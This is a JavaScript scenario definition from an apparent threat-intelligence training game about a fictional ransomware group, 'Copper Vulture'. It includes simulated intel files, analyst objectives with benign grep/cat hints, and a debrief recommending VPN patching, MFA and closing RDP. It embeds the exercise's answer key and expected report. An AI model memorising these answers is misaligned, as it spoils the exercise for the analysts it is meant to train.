  cmds:[...BASIC,'attack','report'], chips:['cat /intel/PIR.txt','head /intel/leaksite_copper_vulture.csv','grep -i "initial access" /intel/reports/*','attack T1133','report'],
  make(){ const sectors=['healthcare','manufacturing','healthcare','education','legal','healthcare','manufacturing','retail','healthcare','government','healthcare','construction','healthcare','manufacturing','legal','retail'];
    const ctry=['US','US','US','UK','US','US','DE','US','UK','US','US','CA','US','US','US','AU'];
    const rows=['date,victim,sector,country']; sectors.forEach((s,i)=>rows.push(`2026-${pad(8+Math.floor(i/6))}-${pad(1+(i*7)%27)},victim-${String(i+1).padStart(2,'0')}.example,${s},${ctry[i]}`));
    const h=H('analyst','ti-workstation','/home/analyst',{
      '/intel/PIR.txt':'PIR-3 (from the CISO): "Is Copper Vulture likely to target us in the next 90 days, and what should we do first?"\nContext: we are a US healthcare provider. We run a FortiGate-style SSL VPN and have some RDP exposed for vendors.',
      '/intel/leaksite_copper_vulture.csv':rows.join('\n'),
      '/intel/reports/vendorA.txt':'Copper Vulture (fictional) - Vendor A, Oct 2026\nInitial access: VPN appliance vulnerability\nExfiltration: rclone to MEGA cloud storage\nImpact: encryption of ESXi hosts',
      '/intel/reports/vendorB.txt':'Copper Vulture - Vendor B, Sep 2026\nInitial access: VPN appliance vulnerability\nInitial access: exposed RDP with weak passwords\nDwell time before encryption: 4-9 days',
      '/intel/reports/vendorC.txt':'Copper Vulture - Vendor C, Nov 2026\nInitial access: VPN appliance vulnerability\nNote: affiliates are actively recruiting healthcare insiders on forums.',
    }); h.fs['/intel/reports'].t='d'; return {hosts:{me:h},h,net:{},st:{}}; },
  truth:{likelihood:['likely'],confidence:['moderate','medium','high'],technique:['t1133','t1190'],recommendation:['vpn','patch','mfa','rdp']},
  reportHint:'likelihood "likely" (or very likely) · confidence moderate · technique T1133 (or T1190) · recommendation: patch the VPN, put MFA on it, close vendor RDP.',
  obj:[
    {t:'Read the requirement', h:'cat /intel/PIR.txt', ok:c=>c.seen.pir},
    {t:'How many of the group’s 16 listed victims are healthcare?', ans:['6'], h:'grep -c healthcare /intel/leaksite_copper_vulture.csv'},
    {t:'How many of those healthcare victims are in the US?', ans:['5'], h:'grep healthcare /intel/leaksite_copper_vulture.csv | grep -c US'},
    {t:'What is their most common initial-access method?', ans:['vpn'], h:'grep -i "initial access" /intel/reports/* | cut -d: -f3 | sort | uniq -c'},
    {t:'Look up the matching ATT&CK technique', h:'attack T1133 (External Remote Services); T1190 also fits an appliance bug.', ok:c=>c.seen.t1133},
    {t:'Answer the PIR', h:'report set likelihood likely · confidence moderate · technique T1133 · recommendation Patch the VPN, add MFA, close vendor RDP · report submit', ok:c=>c.st.submitted},
  ],
  on(c,ev,v){ if(ev==='read'&&/PIR\.txt/.test(v)) c.seen.pir=1; if(ev==='attack'&&/T1133|T1190/.test(v)) c.seen.t1133=1; if(ev==='submit'&&v) c.st.submitted=true; },
  debrief:'<p>A finished answer to the CISO, in three sentences:</p><p><i>"Copper Vulture is <b>likely</b> to target us within 90 days (moderate confidence): over a third of its recent victims are US healthcare, and it gets in through VPN appliances like ours. First action: patch and add MFA to the VPN this week and close vendor RDP. Second: alert on large uploads to cloud storage, their exfiltration method."</i></p><ul><li>Notice what’s left out: malware internals, hashes, jargon. Those go in the technical annex.</li></ul>' },
